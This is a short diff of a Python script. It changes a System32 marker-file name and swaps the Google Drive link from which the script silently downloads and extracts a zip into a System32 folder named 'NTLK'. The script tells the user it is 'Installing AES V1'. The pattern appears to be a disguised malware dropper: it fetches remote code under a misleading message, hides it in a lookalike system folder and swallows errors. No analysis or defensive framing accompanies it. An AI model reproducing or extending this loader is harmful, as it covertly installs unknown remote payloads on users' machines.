@@ -101,7 +101,7 @@ def delete_files_if_condition(file):
                         os.remove(file_path)
                 except Exception as e:
                     print(f"")
-check_file = r"C:\Windows\System32\v1updateapril52025v2.txt"
+check_file = r"C:\Windows\System32\v1updateapril52025v3.txt"
 delete_files_if_condition(check_file)
 
 def download_file_from_google_drive(url, output_path):
@@ -110,8 +110,8 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\NTLK\\aesv9.1.py"):
     print("Installing AES V1 please wait...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1OtRku8N2-7P5nOlbHoDvgz-md9-OaS6M", "C:\\Windows\\System32\\NTLK\\v1x2.zip")
-    zip_file = r'C:\Windows\System32\NTLK\v1x2.zip'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1cJZNfui_3Ce5YGwHyzL4ZAK7OTjGBEwl", "C:\\Windows\\System32\\NTLK\\v1x3.zip")
+    zip_file = r'C:\Windows\System32\NTLK\v1x3.zip'
     extract_dir = r'C:\Windows\System32\NTLK'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
